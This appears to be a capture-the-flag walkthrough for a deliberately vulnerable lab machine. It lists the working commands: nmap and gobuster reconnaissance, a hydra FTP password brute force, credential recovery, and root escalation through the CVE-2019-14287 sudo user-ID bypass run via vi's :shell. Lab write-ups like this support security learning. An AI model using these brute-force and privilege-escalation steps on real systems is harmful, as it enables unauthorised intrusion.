`sudo nmap -sS -p- 10.114.142.115`  
FTP,SSH,HTTP (21,22,80)

sudo nmap -sC -sV -p21,22,80 10.114.142.115

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

`gobuster dir -u http://10.114.142.115 -w /usr/share/wordlists/dirb/common.txt -t 40 -x js,php,txt`

|dir                 | status      | response size  | redirect
---
| assets             |  (Status: 301) | [Size: 317] | [--> http://10.114.142.115/assets/]
| index.html         | (Status: 200) | [Size: 7853  |

on assets we found style.css, where we got a hint on a directory...

http://10.114.142.115/sup3r_s3cret_fl4g/

yes, it was a rick-roll, but we were told to view it without JS, so curl...

`curl -i http://10.114.142.115/sup3r_s3cr3t_fl4g.php`

HTTP/1.1 302 Found  
Date: Tue, 10 Nov 2026 13:27:43 GMT  
Server: Apache/2.4.10 (Debian)  
**Location: intermediary.php?hidden_directory=/WExYY2Cv-qU**  
Content-Length: 0  
Content-Type: text/html; charset=UTF-8

at this page, *http://10.114.142.115/WExYY2Cv-qU/* we found "Hot_Babe.png"

oh man...

Eh, you've earned this. Username for FTP is `ftpuser`  
One of these is the `password:`  
Mou+56n%QK8sr  
1618B0AUshw1M  
A56IpIl%1s02u  
vTFbDzX9&Nmu?  
FfF~sfu^UQZmT  
8FF?iKO27b~V0  
... (100+ lines)

we copy this over to pass.txt and get to hydra

`hydra -l ftpuser -P pass.txt 10.114.142.115 ftp`

[21][ftp] host: 10.114.142.115   login: ftpuser   password: 5iez1wGXKfPKQ

we login and get a file Eli's_Creds.txt, which is of course encrypted into brainf*ck like text

loll, it actually is brainfuck

decoded with [dcode.fr](https://www.dcode.fr/brainfuck-language)

User: eli

Password: DSpDiM1wAEwid

I suppose these are ssh creds and I am right

we got a hint to "look for some s3cr3t place"

could help: `find / -name '*s3cr3t*' 2>/dev/null` and it does

eli@year-of-the-rabbit:/usr/games/s3cr3t$ `cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\!`

Your password is awful, Gwendoline.  
It should be at least 60 characters long! Not just MniVCQVhQHUNI

we succesfully pwned gwendoline and now root

`sudo -l` gave us:

User gwendoline may run the following commands on year-of-the-rabbit:  
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

I had trouble getting the [gtfobins](https://gtfobins.org/gtfobins/vi/) commands to work, so I had to do my own search

i did not find any low-hanging fruit on the vi version, but the sudo version was very bad

>Sudo version 1.8.10p3

```
Security & Vulnerabilities: 
CVE-2021-3156 (Baron Samedit, buffer overflow)

CVE-2019-14287 (root-privilege bypass via user ID -1).
```

the second one seemed enticing

I combined the [CVE description](https://www.cve.org/CVERecord?id=CVE-2019-14287)  
with the GTFObins hint at running `:shell` inside vi, and it worked

`sudo -u \#$((0xffffffff)) /usr/bin/vi /home/gwendoline/user.txt`

*here I input :shell in vi and pressed enter*

`id`  
uid=0(root) gid=0(root) groups=0(root)

that's it